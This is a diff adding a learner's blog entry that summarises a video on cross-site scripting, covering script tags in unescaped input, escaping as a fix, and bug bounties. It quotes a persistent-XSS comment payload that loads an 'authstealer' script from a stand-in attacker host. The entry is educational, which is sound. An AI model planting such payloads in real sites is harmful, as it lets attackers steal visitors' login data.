@@ -11,5 +11,32 @@
     <h2>9/2/2021</h2>
 
     <p>This week I watched <a href="https://www.youtube.com/watch?v=L5l9lSnNMxg" target="_blank">a Computerphile video on cross-site scripting.</a></p>
+    <p>In this video, Tom Scott delves into a malicious trick that turns HTML and Javascript against themselves. 
+        He first explained the basics of Javascript, which was helpful because I have no experience with it. Until watching
+        this video, I had no idea it was a <i>supplement</i> to HTML. I always assumed it was a <i>replacement</i>.
+        Javascript uses the &lt;script&gt; tag to run code in an HTML website. So when compiling an HTML document, the compiler knows
+        to start executing Javascript code as soon as it sees that tag.</p>
+
+    <p>Unfortunately, this can also apply to input text from the user! Meaning if there are no proper measures taken, the user
+        can type the &lt;script&gt; tag into unprotected text input elements and begin running their own code. Luckily, this can be prevented by the 
+        website developers by automatically escaping the relevant characters. However, it only takes one mistake to let malicious users
+        have free rein over the site. Examples from the past include routing all site log-ins through 3rd party databases collecting
+        userdata.
+    </p>
+
+    <p>To safeguard against this, most major companies have "bug bounty" programs. If a tech savvy user finds an exploit like this,
+        they can report it to the developers for a reward. Facebook recently (well, recently in 2013 when the video was made) paid
+        out a $12,000 bounty to a person who reported rather than exploited a cross-site scripting bug. I wouldn't be surprised if some people have made entire
+        careers out of bug-hunting.
+    </p>
+
+    <h2>Examples</h2>
+    <p>Here's an example from Wikipedia. Context: a user logs onto a news website where they can enter comments about the article. 
+        They leave the following comment: </p>
+    <p>I love the puppies in this story! They're so cute!&lt;script src="http://mallorysevilsite.com/authstealer.js"&gt;</p>
+    <p>Now anyone who loads this article has their site authorization data sent to the malicious user's hidden server.</p>
 </body>
+<footer>
+    <p>Source: <a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_attack" target="_blank"></a></p>
+</footer>
 </html>
